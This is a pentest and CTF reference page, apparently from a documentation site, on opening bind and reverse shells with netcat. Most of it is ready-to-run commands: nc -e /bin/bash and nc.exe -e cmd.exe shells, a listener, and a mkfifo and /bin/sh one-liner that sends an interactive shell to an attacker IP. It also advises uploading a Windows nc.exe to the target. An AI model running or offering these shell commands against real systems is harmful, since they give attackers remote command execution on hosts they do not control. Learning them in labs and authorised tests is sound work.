.. _Netcat Shells:

Netcat Shells
=============

+------------+-----------------------------------------------------+
|                   **Reference  Walk-Throughs**                   |
+============+=====================================================+
|`HackTheBox`|:ref:`Lame <Lame Samba>`                             |
+------------+-----------------------------------------------------+
|`VulnHub`   |:ref:`Kioptrix Level 1 <Kioptrix Lv1 Samba>`         |
+------------+-----------------------------------------------------+

+----------+-------------+
| See Also |:ref:`netcat`|
+----------+-------------+

.. index:: netcat

The `netcat` utility is one of the most popular tools for establishing both Bind and Reverse shells during pentests and CTFs. However, it is important to note that the method for establishing these shells will differ based on whether the installed version supports the ``-e`` flag. Without the ``-e`` flag, establishing shells with `netcat` becomes tricky, if not impossible, depending on the target OS.

On Unix-like systems, the lack of ``-e`` flag can be bypassed through some creative I/O redirection. On `Windows` systems, this isn't so easy. Fortunately, `Kali` comes bundled with a `Windows`-compatible ``nc.exe`` binary which has the ``-e`` flag enabled. This file is located in the ``/usr/share/windows-binaries`` directory. If you can manage to upload this file, you can use it to establish both Bind and Reverse shells easily.


Establish Bind Shell
--------------------
With versions of `netcat` which support the ``-e`` flag, creating a bind shell is simple. Examples:

.. code-block:: none

    Unix:    nc -e /bin/bash -lp [Port]
    Windows: nc.exe -e cmd.exe -lp [Port]

In versions of `netcat` without support for the ``-e`` flag, creating a bind shell on `Windows` is not possible. On Unix-like systems, however, bind shells can be established with a little I/O redirection:

.. code-block:: none

    rm /tmp/x;mkfifo /tmp/x;cat /tmp/x |/bin/sh -i 2>&1 |nc -lp [Port] >/tmp/x


Connect to Bind Shell
---------------------
To connect to a Bind shell established on a remote system using `netcat`, use the following syntax:

.. code-block:: none

    Unix:    nc [Target IP] [Port]
    Windows: nc.exe [Target IP] [Port]


Catch a Reverse Shell
---------------------
In order to create a reverse shell, you'll first need to establish a Listener to catch the incoming connection. This can be done with the following syntax:

.. code-block:: none

    Unix:    nc -lp [Port]
    Windows: nc.exe -lp [Port]


Establish Reverse Shell
-----------------------
After creating a Listener to catch incoming connections, you're ready to establish a Reverse shell. In versions of `netcat` with support for the ``-e`` flag, this is simple:

.. code-block:: none

    Unix:    nc -e /bin/bash [Attacker IP] [Port]
    Windows: nc.exe -e cmd.exe [Attacker IP] [Port]

In versions of `netcat` without support for the ``-e`` flag, creating a Reverse shell on `Windows` is not possible. However, in Unix-like systems, it can be accomplished via I/O redirection:

.. code-block:: none

    rm /tmp/x;mkfifo /tmp/x;cat /tmp/x |/bin/sh -i 2>&1 |nc [Attacker IP] [Port] >/tmp/x
